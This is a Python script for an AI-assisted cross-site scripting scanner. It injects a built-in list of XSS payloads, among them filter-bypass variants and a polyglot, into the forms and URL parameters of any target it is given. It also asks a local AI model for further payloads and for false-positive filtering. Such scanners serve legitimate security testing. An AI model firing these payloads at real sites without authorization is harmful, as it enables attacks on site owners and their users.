#!/usr/bin/env python3
"""
AI-Enhanced XSS Scanner with Ollama Cloud Integration
Includes intelligent JavaScript analysis and false positive detection
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import argparse
from colorama import Fore, Style, init
import json
from typing import List, Dict
from bs4 import BeautifulSoup
import re
from tools.ai_analyzer import OllamaAnalyzer

init(autoreset=True)


class AIEnhancedXSSScanner:
    def __init__(self, target_url: str, output_dir: str = "./results", use_ai: bool = True):
        self.target_url = target_url
        self.output_dir = output_dir
        self.use_ai = use_ai
        self.vulnerabilities: List[Dict] = []
        self.js_analysis_results: List[Dict] = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        # Initialize AI analyzer if enabled
        self.ai_analyzer = None
        if self.use_ai:
            try:
                self.ai_analyzer = OllamaAnalyzer()
                print(f"{Fore.GREEN}[+] AI analysis enabled{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] AI analysis disabled: {str(e)}{Style.RESET_ALL}")
                self.use_ai = False
        
        # XSS payloads - ordered from simple to complex
        self.payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Bypass filters
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            # Event handlers
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            
            # Advanced payloads
            "<details open ontoggle=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<form><button formaction=javascript:alert('XSS')>Click",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        ]
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def print_banner(self):
        ai_status = "ENABLED" if self.use_ai else "DISABLED"
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════╗
║      AI-Enhanced XSS Scanner Tool             ║
║      Target: {self.target_url[:30]:<30}║
║      AI Analysis: {ai_status:<28}║
╚═══════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def extract_javascript(self, url: str) -> List[Dict]:
        """Extract JavaScript code from page for AI analysis"""
        js_sources = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract inline scripts
            for script in soup.find_all('script'):
                if script.string and len(script.string.strip()) > 50:
                    js_sources.append({
                        'type': 'inline',
                        'url': url,
                        'code': script.string
                    })
            
            # Extract external scripts
            for script in soup.find_all('script', src=True):
                script_url = urljoin(url, script['src'])
                try:
                    js_response = self.session.get(script_url, timeout=10)
                    if js_response.status_code == 200:
                        js_sources.append({
                            'type': 'external',
                            'url': script_url,
                            'code': js_response.text
                        })
                except:
                    pass
            
            print(f"{Fore.CYAN}[*] Extracted {len(js_sources)} JavaScript sources{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting JavaScript: {str(e)}{Style.RESET_ALL}")
        
        return js_sources
    
    def analyze_javascript_with_ai(self, js_sources: List[Dict]):
        """Analyze JavaScript code using AI"""
        if not self.use_ai or not self.ai_analyzer:
            return
        
        print(f"\n{Fore.CYAN}[AI] Analyzing JavaScript code for DOM XSS...{Style.RESET_ALL}")
        
        for js_source in js_sources[:5]:  # Limit to first 5 sources to avoid rate limits
            analysis = self.ai_analyzer.analyze_javascript_code(
                js_source['code'],
                js_source['url']
            )
            
            self.js_analysis_results.append(analysis)
            
            # Convert AI findings to vulnerability format
            if analysis.get('vulnerabilities'):
                for ai_vuln in analysis['vulnerabilities']:
                    vuln = {
                        'type': 'DOM XSS (AI Detected)',
                        'url': js_source['url'],
                        'method': 'GET',
                        'parameter': ai_vuln.get('sink', 'JavaScript Analysis'),
                        'payload': ai_vuln.get('description', 'See AI analysis'),
                        'severity': analysis.get('risk_level', 'Medium'),
                        'evidence': ai_vuln.get('code_snippet', ''),
                        'ai_detected': True
                    }
                    self.vulnerabilities.append(vuln)
    
    def find_forms(self, url: str) -> List[Dict]:
        """Find all forms on a page"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    if input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            print(f"{Fore.RED}[-] Error finding forms: {str(e)}{Style.RESET_ALL}")
            return []
    
    def get_ai_payloads(self, context: Dict) -> List[str]:
        """Get AI-generated payloads for specific context"""
        if not self.use_ai or not self.ai_analyzer:
            return []
        
        try:
            payloads = self.ai_analyzer.suggest_payloads('XSS', context)
            return payloads[:5]  # Limit to 5 AI-generated payloads
        except:
            return []
    
    def test_reflected_xss_form(self, url: str, form: Dict) -> List[Dict]:
        """Test form for reflected XSS with AI-enhanced payloads"""
        vulnerabilities = []
        action = urljoin(url, form['action']) if form['action'] else url
        
        print(f"{Fore.YELLOW}[*] Testing form at {action}{Style.RESET_ALL}")
        
        # Get AI-suggested payloads if available
        ai_payloads = []
        if self.use_ai:
            context = {
                'url': action,
                'parameter': ', '.join([i['name'] for i in form['inputs']]),
                'input_context': 'HTML form input'
            }
            ai_payloads = self.get_ai_payloads(context)
        
        # Combine standard and AI payloads
        test_payloads = self.payloads[:10] + ai_payloads
        
        for payload in test_payloads:
            data = {}
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button']:
                    data[input_field['name']] = payload
            
            try:
                if form['method'] == 'post':
                    response = self.session.post(action, data=data, timeout=10)
                else:
                    response = self.session.get(action, params=data, timeout=10)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    # Check if it's actually executable (not encoded)
                    if self.is_executable(response.text, payload):
                        vuln = {
                            'type': 'Reflected XSS',
                            'url': action,
                            'method': form['method'].upper(),
                            'parameter': ', '.join([i['name'] for i in form['inputs']]),
                            'payload': payload,
                            'severity': 'High',
                            'evidence': response.text[:500]
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    URL: {action}")
                        print(f"    Payload: {payload}")
                        break  # Found vulnerability, move to next form
            
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def test_reflected_xss_url(self, url: str) -> List[Dict]:
        """Test URL parameters for reflected XSS"""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        print(f"{Fore.YELLOW}[*] Testing URL parameters{Style.RESET_ALL}")
        
        for param in params.keys():
            # Get AI-suggested payloads for this parameter
            ai_payloads = []
            if self.use_ai:
                context = {
                    'url': url,
                    'parameter': param,
                    'input_context': 'URL parameter'
                }
                ai_payloads = self.get_ai_payloads(context)
            
            test_payloads = self.payloads[:10] + ai_payloads
            
            for payload in test_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Rebuild URL with payload
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        if self.is_executable(response.text, payload):
                            vuln = {
                                'type': 'Reflected XSS',
                                'url': test_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High',
                                'evidence': response.text[:500]
                            }
                            vulnerabilities.append(vuln)
                            print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            break
                
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def is_executable(self, html: str, payload: str) -> bool:
        """Check if payload is executable (not HTML encoded)"""
        # Check if payload appears unencoded
        dangerous_chars = ['<', '>', '"', "'", 'script', 'onerror', 'onload']
        
        # Find payload in HTML
        payload_index = html.find(payload)
        if payload_index == -1:
            return False
        
        # Check if it's inside a script tag or event handler
        context = html[max(0, payload_index-100):min(len(html), payload_index+100)]
        
        # Simple check: if special chars are not encoded, likely executable
        for char in ['<', '>', '"', "'"]:
            if char in payload and char in context:
                return True
        
        return False
    
    def scan_dom_xss(self, url: str) -> List[Dict]:
        """Scan for DOM-based XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Look for dangerous JavaScript patterns
            dangerous_patterns = [
                (r'document\.write\s*\(', 'document.write'),
                (r'innerHTML\s*=', 'innerHTML assignment'),
                (r'outerHTML\s*=', 'outerHTML assignment'),
                (r'eval\s*\(', 'eval function'),
                (r'setTimeout\s*\(["\']', 'setTimeout with string'),
                (r'setInterval\s*\(["\']', 'setInterval with string'),
                (r'location\.href\s*=', 'location.href assignment'),
            ]
            
            for pattern, description in dangerous_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    # Extract context around the match
                    start = max(0, match.start() - 50)
                    end = min(len(response.text), match.end() + 50)
                    context = response.text[start:end]
                    
                    vuln = {
                        'type': 'Potential DOM XSS',
                        'url': url,
                        'method': 'GET',
                        'parameter': 'JavaScript Analysis',
                        'payload': description,
                        'severity': 'Medium',
                        'evidence': context
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.YELLOW}[!] Potential DOM XSS pattern found: {description}{Style.RESET_ALL}")
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def apply_ai_analysis(self):
        """Apply AI analysis to all found vulnerabilities"""
        if not self.use_ai or not self.ai_analyzer or not self.vulnerabilities:
            return
        
        print(f"\n{Fore.CYAN}[AI] Analyzing {len(self.vulnerabilities)} vulnerabilities...{Style.RESET_ALL}")
        
        # Analyze each vulnerability
        for i, vuln in enumerate(self.vulnerabilities):
            self.vulnerabilities[i] = self.ai_analyzer.analyze_vulnerability(vuln)
        
        # Detect false positives
        self.vulnerabilities = self.ai_analyzer.detect_false_positives(self.vulnerabilities)
        
        # Filter out high-confidence false positives
        original_count = len(self.vulnerabilities)
        self.vulnerabilities = [
            v for v in self.vulnerabilities
            if not (v.get('false_positive_check', {}).get('is_false_positive') and
                   v.get('false_positive_check', {}).get('confidence', 0) > 80)
        ]
        
        filtered_count = original_count - len(self.vulnerabilities)
        if filtered_count > 0:
            print(f"{Fore.GREEN}[AI] Filtered out {filtered_count} false positives{Style.RESET_ALL}")
    
    def save_results(self):
        """Save scan results"""
        domain = urlparse(self.target_url).netloc
        output_file = os.path.join(self.output_dir, f"{domain}_xss_ai_scan.json")
        
        data = {
            "target": self.target_url,
            "ai_enabled": self.use_ai,
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "javascript_analysis": self.js_analysis_results
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.CYAN}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}AI-Enhanced XSS Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total vulnerabilities found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        critical = sum(1 for v in self.vulnerabilities if v.get('severity') == 'Critical')
        high = sum(1 for v in self.vulnerabilities if v.get('severity') == 'High')
        medium = sum(1 for v in self.vulnerabilities if v.get('severity') == 'Medium')
        low = sum(1 for v in self.vulnerabilities if v.get('severity') == 'Low')
        
        if critical > 0:
            print(f"{Fore.RED}Critical severity: {critical}{Style.RESET_ALL}")
        if high > 0:
            print(f"{Fore.RED}High severity: {high}{Style.RESET_ALL}")
        if medium > 0:
            print(f"{Fore.YELLOW}Medium severity: {medium}{Style.RESET_ALL}")
        if low > 0:
            print(f"{Fore.GREEN}Low severity: {low}{Style.RESET_ALL}")
        
        # Show AI-specific stats
        if self.use_ai:
            ai_detected = sum(1 for v in self.vulnerabilities if v.get('ai_detected'))
            false_positives = sum(1 for v in self.vulnerabilities 
                                 if v.get('false_positive_check', {}).get('is_false_positive'))
            
            print(f"\n{Fore.CYAN}AI Analysis Stats:{Style.RESET_ALL}")
            print(f"  - AI-detected vulnerabilities: {ai_detected}")
            print(f"  - Potential false positives: {false_positives}")
            print(f"  - JavaScript sources analyzed: {len(self.js_analysis_results)}")
        
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    def run(self):
        """Execute AI-enhanced XSS scan"""
        self.print_banner()
        
        # Extract and analyze JavaScript with AI
        if self.use_ai:
            js_sources = self.extract_javascript(self.target_url)
            if js_sources:
                self.analyze_javascript_with_ai(js_sources)
        
        # Test URL parameters
        url_vulns = self.test_reflected_xss_url(self.target_url)
        self.vulnerabilities.extend(url_vulns)
        
        # Find and test forms
        forms = self.find_forms(self.target_url)
        print(f"{Fore.CYAN}[*] Found {len(forms)} forms{Style.RESET_ALL}")
        
        for form in forms:
            form_vulns = self.test_reflected_xss_form(self.target_url, form)
            self.vulnerabilities.extend(form_vulns)
        
        # Scan for DOM XSS patterns
        dom_vulns = self.scan_dom_xss(self.target_url)
        self.vulnerabilities.extend(dom_vulns)
        
        # Apply AI analysis to all findings
        if self.use_ai and self.vulnerabilities:
            self.apply_ai_analysis()
        
        self.print_summary()
        self.save_results()


def main():
    parser = argparse.ArgumentParser(description="AI-Enhanced XSS Scanner Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", default="./results", help="Output directory")
    parser.add_argument("--no-ai", action="store_true", help="Disable AI analysis")
    
    args = parser.parse_args()
    
    scanner = AIEnhancedXSSScanner(args.url, args.output, use_ai=not args.no_ai)
    scanner.run()


if __name__ == "__main__":
    main()
